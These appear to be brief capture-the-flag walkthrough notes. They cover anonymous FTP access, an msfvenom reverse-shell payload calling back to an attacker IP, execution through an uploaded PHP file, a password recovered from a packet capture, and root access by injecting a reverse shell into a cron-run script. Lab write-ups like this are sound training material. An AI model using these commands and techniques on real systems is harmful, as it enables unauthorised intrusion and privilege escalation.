anonymous ftp login

couldn't get a shell to stick from bash commands
couldn't get a shell to stick from PHP reverse shell command

generated reverse shell elf with msfvenom
$ msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=10.18.78.209 LPORT=1234 -f elf -o reverse_shell_elf
uploaded with ftp
executed using bash command from uploaded php file

found .pcapng file in /incidents
contained user (lennie) password

$ ssh lennie@10.10.90.151

series of scripts called by cron
most owned by root, but one (/etc/print.sh) owned by lennie
inject reverse shell command in that script

root crontab ends up being..
* * * * * /home/lennie/scripts/planner.sh 
